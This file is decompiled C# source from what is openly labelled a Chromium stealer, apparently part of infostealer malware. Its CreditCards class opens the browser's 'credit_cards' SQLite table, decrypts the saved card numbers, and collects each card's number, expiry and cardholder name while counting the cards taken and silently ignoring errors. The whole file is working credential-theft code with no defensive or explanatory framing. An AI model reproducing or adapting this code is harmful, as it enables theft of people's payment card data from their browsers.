using System;
using System.Collections.Generic;

namespace Stealer.Chromium
{
	// Token: 0x02000026 RID: 38
	internal sealed class CreditCards
	{
		// Token: 0x060000AD RID: 173 RVA: 0x00007628 File Offset: 0x00005828
		public static List<CreditCard> Get(string sWebData)
		{
			List<CreditCard> list2;
			try
			{
				List<CreditCard> list = new List<CreditCard>();
				SQLite sqlite = SqlReader.ReadTable(sWebData, "credit_cards");
				bool flag = sqlite == null;
				if (flag)
				{
					list2 = list;
				}
				else
				{
					for (int i = 0; i < sqlite.GetRowCount(); i++)
					{
						CreditCard creditCard = default(CreditCard);
						creditCard.sNumber = Crypto.GetUTF8(Crypto.EasyDecrypt(sWebData, sqlite.GetValue(i, 4), false));
						creditCard.sExpYear = Crypto.GetUTF8(sqlite.GetValue(i, 3));
						creditCard.sExpMonth = Crypto.GetUTF8(sqlite.GetValue(i, 2));
						creditCard.sName = Crypto.GetUTF8(sqlite.GetValue(i, 1));
						Counter.CreditCards++;
						list.Add(creditCard);
					}
					list2 = list;
				}
			}
			catch
			{
				list2 = new List<CreditCard>();
			}
			return list2;
		}
	}
}
